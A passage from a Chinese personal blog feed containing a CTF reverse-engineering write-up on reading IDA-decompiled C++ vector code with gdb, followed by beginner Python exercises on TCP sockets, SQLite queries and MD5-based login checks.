class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">4</span> * num + *v24;</span><br><span class="line">  __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::__normal_iterator(&amp;v4, &amp;v3);<span class="comment">// 相当于v4 = v3</span></span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>进行的是这个，他传入的是num,作为偏移，他取出来的是容器的第1个元素，我以下标为0为第一个元素，以后不在赘述</p></li><li><p>4*num + *24 这种写法很常见，在ida6.8尤其显著</p></li><li><p>他将int数组识别为char数组，取值的时候通常也是这样取，假设有个int数组 int num[5] = {1,2,3,4,5}; 在ida6.8里他识别为char num[20]; 取值的时候就num[4*i]，i是循环里的循环变量</p></li></ul><h3 id="接下来是Add部分"><a href="#接下来是Add部分" class="headerlink" title="接下来是Add部分"></a>接下来是Add部分</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Add</span><span class="params">(__int64 &amp;num[<span class="number">1</span>], __int64 &amp;num[n], __int64 p, __int64 &amp;num[<span class="number">0</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = &amp;num[<span class="number">1</span>];                                <span class="comment">// 这里说明下，都是地址</span></span><br><span class="line">  v9 = &amp;num[n];</span><br><span class="line">  v8 = p;</span><br><span class="line">  v7 = &amp;num[<span class="number">0</span>];</span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v10, &amp;v9) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v10);<span class="comment">// v4 = v10</span></span><br><span class="line">    v11 = main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v7, *v4);<span class="comment">// 点进去后发现就是num[0] + *v10</span></span><br><span class="line">    v5 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v8);<span class="comment">// v5 = &amp;v8</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v5, &amp;v11);<span class="comment">// 将结果存到v5里去，v5指向result容器</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v10);<span class="comment">// 指针自加，相当于数组下标+1</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v8);<span class="comment">// 指针++</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体注释我也写好了，匿名函数你在外部看不出什么，然后你双击进去后就能看出他是干什么了，这里就相当于</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt; num.Length; i++)</span><br><span class="line">    num[i] = num[<span class="number">0</span>] + num[i];</span><br></pre></td></tr></table></figure><h3 id="accumulate"><a href="#accumulate" class="headerlink" title="accumulate"></a>accumulate</h3><p>这部分对我来说可能最难理解的吧，他有好多层，我一层层进去后，最后才理解他是如何将容器进行倒置的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> a7)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  v9 = a4;</span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v11, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v11);<span class="comment">//v11就是我们输入的元素，这里你可以对照我上面部分的注释，看传入的参数是什么</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v9);</span><br><span class="line"></span><br><span class="line">    main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v14, &amp;a7, &amp;v13, v7);<span class="comment">//这里是重点，倒置就在这里面</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(v9, &amp;v14);<span class="comment">//赋值语句没什么好说的</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v11);<span class="comment">//自增语句</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(v12, v9);</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先告诉你们我调试出来的结果吧，这部分让我自己看这ida代码，我看了好久，都没看懂他在干嘛，应该还是太菜了，所以我用gdb调试了一波，发觉他是每次取出一个元素，假设第一个元素，取出，第二个元素取出的时候，将他作为容器，将第一组的元素一个个push入栈达到逆置，然后保存这个容器，在取出一个元素，在创建一个只含这个元素的容器，将其作为主容器，将上次保存的容器的每个元素一个个进行push_back();然后循环一直下去就可以达到逆置的效果</p><p>举个例子说明吧： 假设元素为 1 2 3 4 5 6 7 8 9 10<br>第一次：创建一个只含1的容器(1)，其余什么都不做<br>第二次：创建一个只含2的容器(2)，将第一次创建的容器(1)里的元素，全部push到容器(2)里，保存容器(2)<br>第三次：创建一个只含3的容器(3),将容器2里的元素全部push到容器3里面</p><p>具体观察过程可以在循环里下断点进行观察，或者直接步过这部分，直接得到结果知道，由于我这里是分析文章，所以就进行了具体的分析</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::__copy_move&lt;<span class="literal">false</span>,<span class="literal">false</span>,<span class="built_in">std</span>::random_access_iterator_tag&gt;::__copy_m&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;&gt;(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = (a2 - a1) &gt;&gt; <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v5);</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v3, v7);<span class="comment">// 这里创建新容器，将数据压入栈</span></span><br><span class="line">    v7 += <span class="number">4L</span>L;</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一部分我标注的重点里，一直点进去能看到这里的代码，在这里下断，随你用gdb还是ida都可以在这里观察整个过程，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x000000000040133f &lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; std::accumulate&lt;__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)<span class="comment">#2&#125;&gt;(__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;)+113&gt;</span></span><br><span class="line">	breakpoint already hit 8 <span class="built_in">times</span></span><br><span class="line">2       breakpoint     keep y   0x0000000000400fd0 &lt;main+511&gt;</span><br><span class="line">3       breakpoint     keep y   0x00000000004020b3 &lt;std::back_insert_iterator&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;::operator=(int const&amp;)+33&gt;</span><br><span class="line">	breakpoint already hit 6 <span class="built_in">times</span></span><br></pre></td></tr></table></figure><p>我这里用info b让你看下我下的断点，具体也可以自己进行调试，这样会让你更加理解这部分代码<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26uordtnnj31ha0qutji.jpg" alt="result"></p><p>我这里截了部分图，这是第一次循环的时候得到的结果，他只push了8进去，具体调试地址可以从ida里看，在代码界面右键Copy to assembly,在右键<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v4wpbkmj30vu0h6jsw.jpg" alt="picture1"><br>可以得到如下图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v5tijt7j312w0fatch.jpg" alt="picture2"><br>这里便可以获得具体地址，然后调试部分就不讲了，有时间在写篇gdb如何调试的吧，在这题目里需要用的指令有</p><ul><li>x/10wx 显示的如第一张图所显示的一样</li><li>n 下一步</li><li>s 步进，也就是步进函数内部</li><li>c 继续</li><li>start 在开始处下断点</li></ul><p>具体的话:<br>这道题就是输入的第2-16个元素依次加上第一个元素，然后倒序排列，等于斐波那契数列就得出flag了，所以，反推之就是斐波那契数列倒序排列，在2-16个元素减去第一个元素就完美了，贴上代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(n==<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    array= [fib(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)][::<span class="number">-1</span>]</span><br><span class="line">    first = array[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> first,</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(array)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">print</span> array[i+<span class="number">1</span>] - first,</span><br></pre></td></tr></table></figure><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26wkec4pdj30zp0badir.jpg" alt="test"><br>运行截图</p><p>把这段复制到linux上运行即可得到flag，或者直接逆向也得到了</p><p>我的这篇文章文字不多，大部分文字都在代码里写注释了，因为这篇文章针对的就是如何分析C++的vector的反汇编代码，具体多余的文字赘述我也就没写了</p><h3 id="总结下："><a href="#总结下：" class="headerlink" title="总结下："></a><strong>总结下：</strong></h3><ol><li>在ida的f5插件识别出来的不会是你理想的c++代码，比如v24.begin(); 他会变成std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v24)；</int></li><li>在ida的f5插件识别出来的代码下，不清楚的部分可以跟进去，看看具体是什么操作</li><li>需要了解常见的vector容器的基本操作，在自己遇到的时候可以快速识别，不需要步进了解具体过程</li><li>在不了解具体过程的情况下，可以进行动态调试，方便自己理解</li></ol><p>好了，就说这么多了，我这篇图贴的不多，大部分都是代码，似乎都是代码，希望大佬们不要见怪</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/6e2e265a/">https://noone-hub.github.io/posts/6e2e265a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>reverse,逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第八天</title>
    <url>/posts/4a143a03/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><p>服务端与客户端间通过TCP/IP协议通信</p><p><strong>服务端</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connetction from %s:%s...'</span> %addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>) == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello, &#123;&#125;'</span>.format(data).encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    sock.close()</span><br><span class="line">    print(<span class="string">'Connection from %s:%s closed.'</span> %addr)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">print(<span class="string">'Waiting for connection...'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=tcplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>客户端</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p><strong>练习：请编写函数，在 Sqlite 中根据分数段查找指定的名字：</strong></p><p>这道题刚好上学期java期末作业做过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sqlite3</span><br><span class="line"></span><br><span class="line">db_file = os.path.join(os.path.dirname(__file__), <span class="string">'test.db'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(db_file):</span><br><span class="line">    os.remove(db_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始数据:</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(db_file)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">'create table user(id varchar(20) primary key, name varchar(20), score int)'</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-001', 'Adam', 95)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-002', 'Bart', 62)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-003', 'Lisa', 78)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一种我想得到的写法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user order by score"</span>)</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    List = []</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> values:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">2</span>] &gt;= low <span class="keyword">and</span> result[<span class="number">2</span>]&lt;=high:</span><br><span class="line">            List.append(result[<span class="number">1</span>])</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> List</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种写法，感觉更好，直接用数据库排好序了，不知道sql语法的可以跟我上面那个一样</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user where score between ? and ? order by score"</span>,(low,high))</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    name = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> values]</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">80</span>, <span class="number">95</span>) == [<span class="string">'Adam'</span>], get_score_in(<span class="number">80</span>, <span class="number">95</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">80</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>], get_score_in(<span class="number">60</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">100</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>, <span class="string">'Adam'</span>],get_score_in(<span class="number">60</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/4a143a03/">https://noone-hub.github.io/posts/4a143a03/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第七天学习</title>
    <url>/posts/b164eb0e/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="hashlib的使用"><a href="#hashlib的使用" class="headerlink" title="hashlib的使用"></a>hashlib的使用</h2><p><strong>设计一个验证用户登录的函数，根据用户输入的口令是否正确，返回True 或 False：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>so easy,直接贴代码吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,password)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (db[user],calc_md5(password))</span><br><span class="line">    <span class="keyword">if</span> db[user] == calc_md5(password):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> login(<span class="string">'bob'</span>,<span class="string">'123456'</span>):</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"fail"</span>)</span><br></pre></td></tr></table></figure><p><strong>根据用户输入的登录名和口令模拟用户注册，计算更安全的 MD5：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">db[username] = get_md5(password + username + <span 